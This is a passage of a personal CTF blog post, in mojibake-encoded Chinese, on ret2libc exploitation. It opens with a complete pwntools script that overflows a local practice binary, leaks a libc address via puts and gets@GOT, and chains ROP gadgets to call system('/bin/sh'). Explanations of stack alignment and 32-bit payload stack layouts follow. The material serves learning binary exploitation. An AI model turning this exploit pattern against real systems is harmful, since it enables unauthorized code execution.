class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2libc3_x64&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b *0x00000000004006F1&quot;)</span><br><span class="line">elf = ELF(&quot;./ret2libc3_x64&quot;)</span><br><span class="line"></span><br><span class="line">gets_got = elf.got[&quot;gets&quot;]</span><br><span class="line">puts_plt = elf.plt[&quot;puts&quot;]</span><br><span class="line">main_addr = elf.symbols[&quot;main&quot;]</span><br><span class="line"></span><br><span class="line">rdi = 0x0000000000400783 # pop rdi ; ret</span><br><span class="line">ret_gadget = 0x0000000000400784 # Assuming this is a &#x27;ret&#x27; instruction for stack alignment</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&quot;ret2libc3_x64\n&quot;)</span><br><span class="line"></span><br><span class="line">payload1 = b&quot;a&quot; * (0x108)</span><br><span class="line">payload1 += p64(rdi) + p64(gets_got)</span><br><span class="line">payload1 +=p64(puts_plt)+p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(6).ljust(8, b&quot;\x00&quot;))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;gets&quot;, leak_addr)</span><br><span class="line">libc_base = leak_addr - libc.dump(&quot;gets&quot;)</span><br><span class="line">#libc.address = libc_base#æˆ‘æ„Ÿè§‰æ²¡ä»€ä¹ˆç”¨</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.success(&quot;libc_base:&quot; + hex(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">binsh = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line"># ====== ä¿®æ”¹å¼€å§‹ï¼šæ·»åŠ  GDB åŠ¨æ€ä¸‹æ–­ç‚¹ ======</span><br><span class="line">gdb.attach(p, f&#x27;b *&#123;hex(system)&#125;&#x27;)  # åœ¨ system åœ°å€å¤„ä¸‹æ–­ç‚¹</span><br><span class="line"># ====== ä¿®æ”¹ç»“æŸ ======</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&quot;ret2libc3_x64\n&quot;)</span><br><span class="line"></span><br><span class="line">payload2 = b&quot;a&quot; * (0x108)</span><br><span class="line">payload2 += p64(rdi) + p64(binsh)</span><br><span class="line">payload2 += p64(ret_gadget)</span><br><span class="line">payload2 += p64(system)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>å¯¹äºpayload2ç”±äºè€ƒè™‘å †æ ˆå¹³è¡¡ï¼Œæ‰€ä»¥ä¼šæœ‰ä¸¤ä¸ªretæŒ‡ä»¤æ”¾åœ¨ä¸€èµ·</p>
<p>payload2 +&#x3D; p64(rdi) + p64(binsh)<br>payload2 +&#x3D; p64(ret_gadget)</p>
<h4 id="å †æ ˆå¹³è¡¡"><a href="#å †æ ˆå¹³è¡¡" class="headerlink" title="å †æ ˆå¹³è¡¡"></a>å †æ ˆå¹³è¡¡</h4><p>64ä½ç¨‹åºä¸­ï¼Œå‡½æ•°è°ƒç”¨å‰ï¼Œ<strong>æ ˆæŒ‡é’ˆï¼ˆrspï¼‰å¿…é¡»æ˜¯ 16 å­—èŠ‚å¯¹é½çš„</strong> </p>
<p>32ä½ç¨‹åºä¸­ï¼Œå‡½æ•°è°ƒç”¨å‰åï¼Œæ ˆæŒ‡é’ˆ <code>esp</code> çš„å€¼åº”è¯¥ä¿æŒä¸å˜ï¼ˆ32ä½ä¸€èˆ¬ä¸è€ƒè™‘å †æ ˆå¹³è¡¡ï¼‰</p>
<p><strong>âœ… ä¸€ã€é™æ€åˆ†æï¼šè®¡ç®—æ ˆåç§»</strong></p>
<p>ä¸ºäº†æ ˆå¯¹é½ï¼ˆé¿å…å´©æºƒï¼‰ï¼Œä½ æ„é€ çš„ payload ä¸­â€œé™¤äº†å¡«å……éƒ¨åˆ†â€ä¹‹å¤–çš„å†…å®¹ï¼ˆå³ gadget å’Œå‚æ•°ï¼‰æœ€å¥½æ˜¯ä¸€ä¸ªå¶æ•°å—ï¼ˆ8 å­—èŠ‚ä¸ºä¸€å—ï¼‰</p>
<p><strong>âœ… äºŒã€åŠ¨æ€è°ƒè¯•ï¼šä½¿ç”¨ GDB æŸ¥çœ‹ <code>rsp</code> çš„å€¼</strong></p>
<p>å¯¹äºè¿™ä¸€é¢˜æ¥è¯´ï¼Œåœ¨ç¡®å®šäº†libc.soåº“å’ŒlibcåŸºå€ä¹‹åï¼Œåœ¨systemå‡½æ•°å†…åœ¨systemå¤„è®¾ç½®æ–­ç‚¹</p>
<p>ä¹‹åè¿è¡Œè¿™ä¸ªè„šæœ¬</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250716102357535.png"  alt="image-20250716102357535"></p>
<p>è¿™é‡Œå°±é€‰æ‹©å¥½libcç‰ˆæœ¬äº†</p>
<p>ä¹‹ååŠ¨æ€è°ƒè¯•æŸ¥çœ‹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250717160428491.png"  alt="image-20250717160428491"></p>
<p>åœ¨åˆšè¿›å…¥è¿™ä¸ªå‡½æ•°çš„ç¬¬ä¸€æ­¥ï¼Œå°±å·²ç»å¤„äºä¸å¹³è¡¡çš„çŠ¶æ€äº†</p>
<p>å› ä¸ºå®ƒåœ¨è°ƒç”¨å‰æ˜¯æ ˆå¹³è¡¡ï¼Œè°ƒç”¨æ—¶ä¼šæœ‰push rsp æŒ‡ä»¤æ”¹å˜</p>
<p>æŸ¥çœ‹æ ˆé¡¶çš„å‘½ä»¤æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info register rsp</span><br></pre></td></tr></table></figure>





<h2 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h2><p>å¯¹äºæ„é€ çš„ropé“¾</p>
<h3 id="å¡«å……è¿”å›åœ°å€"><a href="#å¡«å……è¿”å›åœ°å€" class="headerlink" title="å¡«å……è¿”å›åœ°å€"></a><strong>å¡«å……è¿”å›åœ°å€</strong></h3><table>
<thead>
<tr>
<th>å¡«å……çš„è¿”å›åœ°å€</th>
<th>æ•ˆæœ</th>
</tr>
</thead>
<tbody><tr>
<td><code>main()</code></td>
<td>è®©ç¨‹åºé‡æ–°è¿è¡Œ main å‡½æ•°ï¼ˆå¯é‡å¤åˆ©ç”¨ï¼‰</td>
</tr>
<tr>
<td><code>_start</code></td>
<td>é‡æ–°å¼€å§‹æ•´ä¸ªç¨‹åº</td>
</tr>
<tr>
<td>shellcode åœ°å€</td>
<td>å¦‚æœä½ æƒ³ç»§ç»­æ‰§è¡Œè‡ªå·±çš„ä»£ç </td>
</tr>
<tr>
<td><code>exit()</code>æˆ–<code>_exit()</code></td>
<td>å®‰å…¨é€€å‡ºç¨‹åº</td>
</tr>
</tbody></table>
<p>è¿”å›åœ°å€å†™0çš„æ—¶å€™å¶å°”ä¼šæŠ¥é”™</p>
<h3 id="è¿”å›åœ°å€å¤„ç†"><a href="#è¿”å›åœ°å€å¤„ç†" class="headerlink" title="è¿”å›åœ°å€å¤„ç†"></a>è¿”å›åœ°å€å¤„ç†</h3><p><strong>ğŸ¯ 2. 32 ä½ vs 64 ä½åœ°å€</strong></p>
<table>
<thead>
<tr>
<th>é¡¹ç›®</th>
<th>32 ä½</th>
<th>64 ä½</th>
</tr>
</thead>
<tbody><tr>
<td>åœ°å€é•¿åº¦ï¼ˆä½ï¼‰</td>
<td>32 ä½ &#x3D; 4 å­—èŠ‚</td>
<td>64 ä½ &#x3D; 8 å­—èŠ‚</td>
</tr>
<tr>
<td>Python é‡Œçš„è¡¨ç¤º</td>
<td>0xdeadbeef</td>
<td>0x7fffdeadbeef</td>
</tr>
<tr>
<td>æ‰“åŒ…å‡½æ•°</td>
<td><code>p32()</code></td>
<td><code>p64()</code></td>
</tr>
<tr>
<td>è§£åŒ…å‡½æ•°</td>
<td><code>u32()</code></td>
<td><code>u64()</code></td>
</tr>
</tbody></table>
<p>32ä½æ¥æ”¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leak = p.recv(4)      # 32ä½æ³„éœ²ä¸€èˆ¬æ˜¯4å­—èŠ‚</span><br><span class="line">addr = u32(leak)      # è½¬æˆ int</span><br></pre></td></tr></table></figure>

<p>64ä½æ¥æ”¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leak = p.recv(6)              # é€šå¸¸èƒ½æ”¶åˆ°6å­—èŠ‚ï¼Œæœ‰æ—¶å€™é«˜ä¸¤å­—èŠ‚æ˜¯0</span><br><span class="line">addr = u64(leak.ljust(8, b&#x27;\x00&#x27;))  # è¡¥æˆ8å­—èŠ‚å†è§£åŒ…</span><br></pre></td></tr></table></figure>

<p><code>ljust(length, fillchar)</code> ä¼šå°†å½“å‰çš„å­—èŠ‚ä¸² <code>leak</code> <strong>å·¦å¯¹é½</strong>åˆ°æŒ‡å®šçš„ <code>length</code>ï¼ˆè¿™é‡Œæ˜¯ 8 å­—èŠ‚ï¼‰ï¼Œå¹¶ä½¿ç”¨ <code>fillchar</code>ï¼ˆè¿™é‡Œæ˜¯ <code>b&#39;\x00&#39;</code>ï¼Œå³ç©ºå­—èŠ‚ï¼‰ä»<strong>å³ä¾§</strong>è¿›è¡Œå¡«å……ã€‚</p>
<h3 id="æŸ¥çœ‹è°ƒç”¨å‡½æ•°çš„ä¼ é€’çš„å‚æ•°"><a href="#æŸ¥çœ‹è°ƒç”¨å‡½æ•°çš„ä¼ é€’çš„å‚æ•°" class="headerlink" title="æŸ¥çœ‹è°ƒç”¨å‡½æ•°çš„ä¼ é€’çš„å‚æ•°"></a><strong>æŸ¥çœ‹è°ƒç”¨å‡½æ•°çš„ä¼ é€’çš„å‚æ•°</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=b&#x27;a&#x27;*(0x48+4)+p32(sys)+p32(main_addr)+p32(sh_addr)</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250718122316108.png"  alt="image-20250718122316108"></p>
<p><strong>1. åˆå§‹çŠ¶æ€ï¼ˆæ‰§è¡Œ <code>ret</code> å‰ï¼‰</strong></p>
<p>å‡è®¾æ­¤æ—¶æ ˆå¸ƒå±€å¦‚ä¸‹ï¼ˆæ ¹æ®ä½ çš„ payloadï¼‰ï¼š</p>
<p>python</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*(0x48+4) + p32(sys) + p32(0x08048722) + p32(sh)</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>æ ˆå†…å­˜å¸ƒå±€</strong>ï¼š</p>
<p>text</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">esp        -&gt; 0x80484d0          ï¼ˆè¦†ç›–çš„è¿”å›åœ°å€ï¼ŒæŒ‡å‘ system@pltï¼‰</span><br><span class="line">esp + 4    -&gt; 0x08048722         ï¼ˆä¼ªé€ çš„è¿”å›åœ°å€ï¼‰</span><br><span class="line">esp + 8    -&gt; 0x080482ea         ï¼ˆå‚æ•° &quot;sh&quot; çš„åœ°å€ï¼‰</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>å¯„å­˜å™¨çŠ¶æ€</strong>ï¼š</p>
<ul>
<li><code>eip</code>ï¼šæŒ‡å‘ <code>GetFlag+90</code> çš„ <code>ret</code> æŒ‡ä»¤ã€‚</li>
<li><code>esp</code>ï¼šæŒ‡å‘æ ˆé¡¶ <code>0x80484d0</code>ã€‚</li>
</ul>
</li>
</ul>
<p><strong>2. æ‰§è¡Œ <code>ret</code> æŒ‡ä»¤</strong></p>
<p><code>ret</code> ç­‰ä»·äº <code>pop eip</code>ï¼Œå…·ä½“æ“ä½œï¼š</p>
<ol>
<li><p><strong>ä»æ ˆé¡¶å¼¹å‡ºè¿”å›åœ°å€åˆ° <code>eip</code></strong>ï¼š</p>
<ul>
<li><code>eip = [esp]</code> â†’ <code>eip = 0x80484d0</code>ï¼ˆè·³è½¬åˆ° <code>system@plt</code>ï¼‰ã€‚</li>
<li><code>esp = esp + 4</code> â†’ æ ˆæŒ‡é’ˆä¸Šå‡ 4 å­—èŠ‚ã€‚</li>
</ul>
</li>
<li><p><strong>æ ˆå˜åŒ–</strong>ï¼š</p>
<p>text</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">esp        -&gt; 0x08048722         ï¼ˆåŸ esp + 4ï¼‰</span><br><span class="line">esp + 4    -&gt; 0x080482ea         ï¼ˆå‚æ•° &quot;sh&quot;ï¼‰</span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>3. è¿›å…¥ <code>system@plt</code> åçš„æµç¨‹</strong></p>
<p>(1) é¦–æ¬¡è°ƒç”¨ <code>system@plt</code>ï¼ˆGOT æœªè§£æï¼‰</p>
<p><code>system@plt</code> çš„ä»£ç ï¼š</p>
<p>asm</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x80484d0 &lt;system@plt&gt;    jmp    [0x804a024]   ; è·³è½¬åˆ° GOT è¡¨ï¼ˆé¦–æ¬¡æŒ‡å‘ä¸‹ä¸€è¡Œï¼‰</span><br><span class="line">0x80484d6 &lt;system@plt+6&gt;  push   0x30          ; é‡å®šä½åç§»</span><br><span class="line">0x80484db &lt;system@plt+11&gt; jmp    0x8048460     ; è·³è½¬åˆ°åŠ¨æ€é“¾æ¥å™¨</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong><code>jmp [0x804a024]</code></strong>ï¼š</p>
<ul>
<li>é¦–æ¬¡è°ƒç”¨æ—¶ï¼ŒGOT è¡¨ <code>0x804a024</code> ä¸­çš„å€¼ä¸º <code>0x80484d6</code>ï¼ˆå³ <code>system@plt+6</code>ï¼‰ï¼Œå› æ­¤ç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚</li>
</ul>
</li>
<li><p><strong><code>push 0x30</code></strong>ï¼š</p>
<ul>
<li><p><code>esp = esp - 4</code> â†’ æ ˆæŒ‡é’ˆä¸‹é™ 4 å­—èŠ‚ã€‚</p>
</li>
<li><p><code>[esp] = 0x30</code> â†’ å°† <code>0x30</code> å‹æ ˆã€‚</p>
</li>
<li><p><strong>æ ˆå˜åŒ–</strong>ï¼š</p>
<p>text</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">esp        -&gt; 0x30               ï¼ˆæ–°å‹å…¥çš„å€¼ï¼‰</span><br><span class="line">esp + 4    -&gt; 0x08048722         ï¼ˆä¼ªé€ çš„è¿”å›åœ°å€ï¼‰</span><br><span class="line">esp + 8    -&gt; 0x080482ea         ï¼ˆå‚æ•° &quot;sh&quot;ï¼‰</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong><code>jmp 0x8048460</code></strong>ï¼š</p>
<ul>
<li>è·³è½¬åˆ°åŠ¨æ€é“¾æ¥å™¨ï¼ˆ<code>_dl_runtime_resolve</code>ï¼‰ï¼Œè§£æ <code>system</code> çš„çœŸå®åœ°å€å¹¶æ›´æ–° GOT è¡¨ã€‚</li>
<li>*(2) åŠ¨æ€é“¾æ¥å™¨è§£æå®Œæˆå</li>
</ul>
</li>
<li><p>åŠ¨æ€é“¾æ¥å™¨ä¼šå°† <code>system</code> çš„çœŸå®åœ°å€å†™å…¥ GOT è¡¨ <code>0x804a024</code>ã€‚</p>
</li>
<li><p>åç»­è·³è½¬åˆ° <code>system</code> çš„çœŸå®ä»£ç ã€‚</p>
</li>
</ul>
<p><strong>4. æ‰§è¡Œ <code>system</code> å‡½æ•°æ—¶</strong></p>
<p><strong>(1) <code>system</code> çš„è°ƒç”¨çº¦å®šï¼ˆcdeclï¼‰</strong></p>
<ul>
<li><p><strong>å‚æ•°é€šè¿‡æ ˆä¼ é€’</strong>ï¼š</p>
<ul>
<li><code>call system</code> ä¼šéšå¼å‹å…¥è¿”å›åœ°å€ï¼ˆä½†ä½ çš„æ¼æ´åˆ©ç”¨ç›´æ¥è·³è½¬åˆ° <code>system@plt</code>ï¼Œæœªé€šè¿‡ <code>call</code>ï¼‰ã€‚</li>
<li>å‚æ•°ä½äº <code>esp + 4</code>ï¼ˆå› ä¸º <code>esp</code> æŒ‡å‘è¿”å›åœ°å€ï¼‰ã€‚</li>
</ul>
</li>
<li><p><strong>ä½ çš„åœºæ™¯</strong>ï¼š</p>
<ul>
<li><p>åŠ¨æ€é“¾æ¥å™¨è§£æå®Œæˆåï¼Œç›´æ¥è·³è½¬åˆ° <code>system</code> çš„çœŸå®ä»£ç ã€‚</p>
</li>
<li><p>æ­¤æ—¶æ ˆå¸ƒå±€ï¼š</p>
<p>text</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">esp        -&gt; 0x08048722         ï¼ˆä¼ªé€ çš„è¿”å›åœ°å€ï¼‰</span><br><span class="line">esp + 4    -&gt; 0x080482ea         ï¼ˆå‚æ•° &quot;sh&quot;ï¼‰</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>system</code> ä¼šä» <code>esp + 4</code> è¯»å–å‚æ•°ï¼ˆå³ <code>0x080482ea</code>ï¼‰ï¼Œæ‰§è¡Œ <code>system(&quot;sh&quot;)</code>ã€‚</p>
</li>
</ul>
</li>
</ul>
<p><strong>(2) <code>system</code> æ‰§è¡Œåçš„æ ˆå¹³è¡¡</strong></p>
<ul>
<li>å¦‚æœæ˜¯æ­£å¸¸ <code>call system</code>ï¼Œè°ƒç”¨è€…éœ€é€šè¿‡ <code>add esp, 4</code> æ¸…ç†å‚æ•°ã€‚</li>
<li>ä½†ä½ çš„æ¼æ´åˆ©ç”¨ä¸­ï¼š<ul>
<li>é€šè¿‡ <code>ret</code> è·³è½¬åˆ° <code>system@plt</code>ï¼Œæœªæ˜¾å¼ä½¿ç”¨ <code>call</code>ã€‚</li>
<li><code>system</code> æ‰§è¡Œå®Œæ¯•åä¼šè¿”å›åˆ° <code>0x08048722</code>ï¼ˆä¼ªé€ çš„åœ°å€ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<p><strong>5. å…¨ç¨‹ <code>esp</code> å˜åŒ–æ€»ç»“</strong></p>
<table>
<thead>
<tr>
<th align="left">æ­¥éª¤</th>
<th align="left"><code>esp</code> å˜åŒ–</th>
<th align="left">æ ˆå¸ƒå±€ï¼ˆæ ˆé¡¶å‘ä¸‹ï¼‰</th>
</tr>
</thead>
<tbody><tr>
<td align="left">æ‰§è¡Œ <code>ret</code> å‰</td>
<td align="left"><code>esp</code> â†’ <code>0x80484d0</code></td>
<td align="left"><code>[0x80484d0, 0x08048722, 0x080482ea]</code></td>
</tr>
<tr>
<td align="left">æ‰§è¡Œ <code>ret</code></td>
<td align="left"><code>esp += 4</code> â†’ <code>0x08048722</code></td>
<td align="left"><code>[0x08048722, 0x080482ea]</code></td>
</tr>
<tr>
<td align="left"><code>system@plt</code> ä¸­ <code>push 0x30</code></td>
<td align="left"><code>esp -= 4</code> â†’ <code>0x30</code></td>
<td align="left"><code>[0x30, 0x08048722, 0x080482ea]</code></td>
</tr>
<tr>
<td align="left">åŠ¨æ€é“¾æ¥å™¨è§£æå®Œæˆ</td>
<td align="left"><code>esp</code> æ¢å¤ä¸º <code>0x08048722</code></td>
<td align="left"><code>[0x08048722, 0x080482ea]</code></td>
</tr>
<tr>
<td align="left"><code>system</code> è¯»å–å‚æ•°</td>
<td align="left">ä» <code>esp + 4</code> è¯»å– <code>0x080482ea</code></td>
<td align="left">å‚æ•° <code>&quot;sh&quot;</code> è¢«æ­£ç¡®ä¼ é€’</td>
</tr>
</tbody></table>
<p><strong>6. å…³é”®ç»“è®º</strong></p>
<ol>
<li><strong><code>ret</code> ç›´æ¥ä¿®æ”¹ <code>eip</code> å’Œ <code>esp</code></strong>ï¼š<ul>
<li>é€šè¿‡å¼¹å‡ºè¿”å›åœ°å€å®ç°æ§åˆ¶æµåŠ«æŒï¼Œ<code>esp</code> ä¼š <strong>+4</strong>ã€‚</li>
</ul>
</li>
<li><strong><code>system</code> çš„å‚æ•°ä¼ é€’ä¾èµ–æ ˆå¸ƒå±€</strong>ï¼š<ul>
<li>ç¡®ä¿ <code>ret</code> åï¼Œ<code>esp + 4</code> æŒ‡å‘å‚æ•°åœ°å€ï¼ˆä½ çš„ payload å·²æ»¡è¶³ï¼‰ã€‚</li>
</ul>
</li>
<li><strong>åŠ¨æ€é“¾æ¥çš„é¢å¤–æ ˆæ“ä½œ</strong>ï¼š<ul>
<li>é¦–æ¬¡è°ƒç”¨ PLT æ—¶ä¼šæœ‰ <code>push 0x30</code>ï¼Œ<code>esp</code> ä¼š <strong>-4</strong>ï¼Œä½†æœ€ç»ˆä¸å½±å“å‚æ•°ä½ç½®ã€‚</li>
</ul>
</li>
</ol>
<p>é€šè¿‡æ§åˆ¶ <code>ret</code> åçš„æ ˆå¸ƒå±€ï¼Œä½ æˆåŠŸå°† <code>&quot;sh&quot;</code> ä¼ é€’ç»™ <code>system</code>ï¼Œæœ€ç»ˆè·å– shellã€‚</p>

                    
                </div>

                

                <div class="post-bottom-tags-and-share border-box">
                    <div>
                        
                            <ul class="post-tags-box border-box">
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/PWN/">PWN</a>
                                    </li>
                                
                            </ul>
                        
                    </div>
                    <div>
                        
                    </div>
                </div>

                

                
                    <div class="post-nav border-box">
                        
                            <div class="prev-post">
                                <a class="prev"
                                   rel="prev"
                                   href="/2025/07/10/picoCTF2022/"
                                   title="picoCTF2022"
                                >
                                    <span class="left arrow-icon flex-center">
                                        <i class="fas fa-chevron-left"></i>
                                    </span>
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">picoCTF2022</span>
                                        <span class="post-nav-item">Prev posts</span>
                                    </span>
                                </a>
                            </div>
                        
                        
                            <div class="next-post">
                                <a class="next"
                                   rel="next"
                                   href="/2025/03/19/ida%E4%BD%BF%E7%94%A8-%E5%8A%A8%E8%B0%83/"
                                   title="idaä½¿ç”¨+åŠ¨è°ƒ"
                                >
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">idaä½¿ç”¨+åŠ¨è°ƒ</span>
                                        <span class="post-nav-item">Next posts</span>
                                    </span>
                                    <span class="right arrow-icon flex-center">
                                        <i class="fas fa-chevron-right"></i>
                                    </span>
                                </a>
                            </div>
                        
                    </div>
                

                
                    






                
            </div>
        </div>

        
    </div>
</div>


                
            </div>
        </div>

        <div class="page-main-content-bottom border-box">
            
<footer class="footer border-box">
    <div class="copyright-info info-item">
    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2025
    
            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">zach0ry</a>
        
    </div>

    <div class="theme-info info-item">
        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
    </div>

    

    

    
</footer>

        </div>
    </div>

    <!-- post tools -->
    
        <div class="post-tools right-toc">
            <div class="post-tools-container border-box">
    <ul class="post-tools-list border-box">
        <!-- PC encrypt again -->
        

        <!-- PC TOC show toggle -->
        

        <!-- PC go comment -->
        

        <!-- PC full screen -->
        <li class="tools-item flex-center full-screen">
            <i class="fa-solid fa-expand"></i>
        </li>
    </ul>
</div>

        </div>
    

    <!-- side tools -->
    <div class="side-tools">
        <div class="side-tools-container border-box ">
    <ul class="side-tools-list side-tools-show-handle border-box">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <!-- toggle mode -->
        
            <li class="tools-item tool-toggle-theme-mode flex-center">
                <i class="fas fa-moon"></i>
            </li>
        

        <!-- rss -->
        

        <!-- to bottom -->
        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list border-box">
        

        

        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
            <i class="arrow fas fa-arrow-up"></i>
            <span class="percent"></span>
        </li>
    </ul>
</div>

    </div>

    <!-- image mask -->
    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    <!-- local search -->
    

    <!-- tablet toc -->
    
</main>





<!-- common js -->

<script src="/js/utils.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/toggle-theme.js"></script>

<script src="/js/code-block.js"></script>

<script src="/js/main.js"></script>

<script src="/js/libs/anime.min.js"></script>


<!-- local search -->


<!-- lazyload -->


<div class="">
    <!-- home page -->
    

    <!-- post page -->
    
        <!-- post-helper -->
        
<script src="/js/post/post-helper.js"></script>


        <!-- toc -->
        

        <!-- copyright-info -->
        

        <!-- share -->
        
    

    <!-- categories page -->
    

    <!-- links page -->
    

    <!-- photos page -->
    

    <!-- tools page -->
    
</div>

<!-- mermaid -->


<!-- pjax -->



</body>
</html>
